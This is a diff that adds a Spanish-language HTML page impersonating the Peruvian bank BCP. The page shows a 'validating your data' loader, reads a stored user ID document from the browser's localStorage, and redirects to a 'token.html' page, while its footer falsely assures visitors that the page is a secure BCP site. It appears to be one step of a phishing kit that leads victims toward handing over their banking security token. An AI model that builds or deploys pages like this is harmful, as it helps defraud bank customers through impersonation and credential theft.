@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validando... - BCP</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="docs/style.css">
+    <style>
+        /* Estilos específicos para el estado de carga */
+        .loader-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+            min-height: 350px;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #ff7900; /* Naranja BCP */
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 25px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loader-container h2 {
+            color: #022B95;
+            font-size: 24px;
+            margin-bottom: 15px;
+        }
+
+        .loader-container p {
+            color: #666;
+            font-size: 16px;
+            line-height: 1.6;
+            max-width: 320px;
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <div class="sidebar">
+            <div class="sidebar-header">
+                <img src="docs/logo.svg" alt="BCP" width="90">
+            </div>
+            <div class="sidebar-image"></div>
+        </div>
+
+        <div class="login-section">
+            <div class="timer">
+                Validación de seguridad en curso... <i class="fa-regular fa-clock"></i>
+            </div>
+
+            <div class="form-container">
+<h2>Estamos validando tus datos</h2><br>
+                <div class="card-box loader-container">
+                    
+                    
+<div class="spinner"></div>
+                    <p>Por favor, <strong>no cierres ni actualices</strong> esta ventana mientras verificamos tu información con el servidor de seguridad.</p>
+<img src="">
+                </div>
+            </div>
+            
+            <footer class="footer-text">
+                <i class="fa-solid fa-lock"></i> Esta es una página segura del BCP. Si tienes dudas sobre la autenticidad de la web, comunícate con<br>
+                nosotros al (01) 311-9898 o a través de nuestros medios digitales.
+            </footer>
+        </div>
+    </div>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script>
+        // RECUPERAR EL DOCUMENTO PARA LOGS (OPCIONAL)
+        const doc = localStorage.getItem('user_doc');
+        console.log("Validando sesión para:", doc);
+
+        // CONFIGURACIÓN DE REDIRECCIÓN (20 SEGUNDOS)
+        setTimeout(() => {
+            
+            window.location.href = "token.html"; 
+        }, 10000);
+    </script>
+</body>
+</html>
